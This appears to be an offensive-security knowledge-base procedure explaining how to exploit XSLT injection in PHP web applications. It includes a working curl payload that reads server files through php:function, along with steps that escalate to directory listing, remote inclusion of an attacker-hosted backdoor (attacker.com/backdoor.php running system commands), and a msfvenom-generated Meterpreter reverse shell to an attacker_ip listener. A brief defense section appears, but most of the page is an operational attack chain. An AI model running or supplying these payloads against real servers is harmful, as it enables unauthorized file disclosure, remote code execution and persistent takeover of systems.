---
id: 06a2ebfd-e1d5-487b-85d3-40f14d28f693
name: xslt-injection-for-php-remote-code-execution
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011]]'
  - '[[tactics/Defense Evasion|TA0005]]'
  - '[[tactics/Execution|TA0002]]'
  - '[[tactics/Lateral Movement|TA0008]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059]]'
  - '[[techniques/Obfuscated Files or Information|T1027]]'
  - '[[techniques/Remote File Copy|T1105]]'
  - '[[techniques/XSL Script Processing|T1220]]'
sub_techniques: []
tags:
  - '[[tags/exploit]]'
  - '[[tags/rce-php-wrapper]]'
  - '[[tags/xslt-injection]]'
commands:
  - '[[commands/inject-xslt-php-readfile]]'
platforms:
  - Web
  - PHP
tools: []
validated: true
---

# XSLT Injection for PHP Remote Code Execution

## Summary

This procedure demonstrates how to exploit XSLT injection vulnerabilities in web applications to achieve remote code execution (RCE) on PHP-enabled servers. By injecting malicious XSLT stylesheets that leverage PHP wrappers, attackers can execute functions like readfile, scandir, assert, and eval, enabling file reading, directory listing, remote file inclusion, and even payload execution such as a Meterpreter reverse shell. This technique targets applications that process untrusted XML input with XSLT transformations without proper validation.

## Description

XSLT Injection occurs when user-controlled input is processed as part of an XSLT stylesheet, allowing attackers to inject custom XSLT elements that invoke PHP functions via the 'php://' wrapper or similar mechanisms. This exploit chain starts with simple information disclosure (e.g., reading files or listing directories) and escalates to full RCE by including remote PHP files or evaluating base64-encoded payloads. It is effective against legacy XML parsers like libxml in PHP configurations where external entity processing is enabled. The target environment is typically a web server running PHP with XSLT support, such as Apache with mod_php. Success relies on identifying an injection point, such as a search field or XML upload feature, and delivering the payload via HTTP requests. Potential outcomes include data exfiltration, command execution, and establishing persistence through backdoors.

## Requirements

1. Access to a vulnerable web application endpoint that processes user-supplied XML/XSLT without sanitization (e.g., via POST request to an XML processing script).
2. Knowledge of the injection point and the server's PHP configuration (e.g., libxml allowing PHP functions in XSLT).
3. Tools for crafting and sending HTTP requests, such as curl or Burp Suite.
4. Attacker-controlled server for hosting remote PHP files or listening for reverse shells (for advanced steps).
5. Base64-encoded payload for Meterpreter or similar (generated via msfvenom for the final step).

## Defense

- Implement strict input validation and sanitization for all XML/XSLT inputs, disabling external entity processing in libxml (e.g., libxml_disable_entity_loader(true) in PHP).
- Use a Web Application Firewall (WAF) to detect and block anomalous XML payloads containing PHP function calls or unusual namespaces.
- Regularly update PHP and XML libraries to patch known vulnerabilities, and avoid processing untrusted XSLT in production environments.
- Enable logging for XML parsing errors and monitor for unexpected file access or network connections from the web server process.

## Objectives

1. Read arbitrary files from the server to disclose sensitive information like configuration files or source code.
2. Enumerate directories to map the file system and identify valuable targets.
3. Execute remote PHP code to perform arbitrary actions, such as running system commands or including backdoors.
4. Deploy a persistent payload like a Meterpreter session for full system compromise.

## Instructions

### Step 1: Identify Injection Point and Test Basic XSLT Processing

**Context**: Locate the vulnerable endpoint (e.g., a form or API that accepts XML) and confirm XSLT processing is active. Send a benign XSLT payload to verify output reflection.

Use a tool like curl to POST a simple XML document with XSLT to the target endpoint, such as http://target.com/process-xml.php.

**Command** ([[commands/inject-xslt-php-readfile]]):
```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function(\'readfile\',\'index.php\')" /></body></html>' http://target.com/vulnerable-endpoint
```

> This injects an XSLT payload using the PHP readfile function to output the contents of index.php. If successful, the response will contain the file's source code in XML format. Adjust the endpoint URL and file path as needed. If the file is not found, try common paths like /etc/passwd on Linux or web.config on Windows.

### Step 2: Read Arbitrary File Using PHP Wrapper

**Context**: Once injection is confirmed, target specific files for disclosure. This step uses the readfile function via XSLT to exfiltrate file contents.

Reference the payload [[codes/xslt-php-readfile-payload]] and substitute the file path.

Deliver via HTTP POST as in Step 1, replacing the data with the code from [[codes/xslt-php-readfile-payload]].

> The payload declares the php namespace and uses xsl:value-of to invoke readfile. Expected output is the raw file contents embedded in the XML response. This reveals server-side code, configs, or system files, aiding further enumeration.

### Step 3: Enumerate Directory Contents

**Context**: Map the file system to find interesting files or directories. Use scandir to list contents of the current or specified directory.

Reference the payload [[codes/xslt-php-scandir-payload]] and adjust the directory path (e.g., '.' for current, '/var/www' for web root).

Deliver via HTTP POST similar to Step 1.

> The payload invokes scandir via php:function, outputting an array of files/directories as a string in the response. Parse the output to identify upload directories, logs, or config files. If sorted alphabetically, use this for targeted reads in subsequent steps.

### Step 4: Execute Remote PHP File Inclusion

**Context**: Escalate to RCE by including and executing a PHP file hosted on an attacker-controlled server. This allows running arbitrary PHP code remotely.

Reference the payload [[codes/xslt-php-assert-include-payload]] and update the include URL to your malicious PHP file (e.g., http://attacker.com/backdoor.php containing <?php system($_GET['cmd']); ?>).

Deliver via HTTP POST.

> The payload uses assert to evaluate the include statement. If successful, the remote file executes, and any output (e.g., command results) appears in the response. Test with a simple echo or file write to confirm execution.

### Step 5: Execute Base64-Encoded Meterpreter Payload

**Context**: Achieve full RCE with a persistent shell. Encode a Meterpreter payload in base64 and evaluate it using preg_replace with the /e modifier for code execution.

Reference the payload [[codes/xslt-php-eval-base64-meterpreter-payload]] and replace 'Base64-encoded Meterpreter code' with your actual base64 (e.g., generated via msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw | base64).

Deliver via HTTP POST and start a listener (e.g., msfconsole use multi/handler set payload php/meterpreter_reverse_tcp).

> The payload decodes and evals the base64 string via preg_replace. Success is indicated by a Meterpreter session connecting back. This provides command execution, file upload, and persistence capabilities.

## Expected Output

Successful injections return XML responses embedding the results of PHP functions (e.g., file contents as text nodes, directory lists as serialized arrays, or execution output). Errors may include PHP warnings if functions fail, but no output indicates blocking or invalid injection.

## Success Indicators

- File contents or directory listings appear in the HTTP response body.
- Remote includes execute without syntax errors, producing expected side effects (e.g., new files created).
- Meterpreter session establishes, allowing interactive commands like 'sysinfo' or 'shell'.
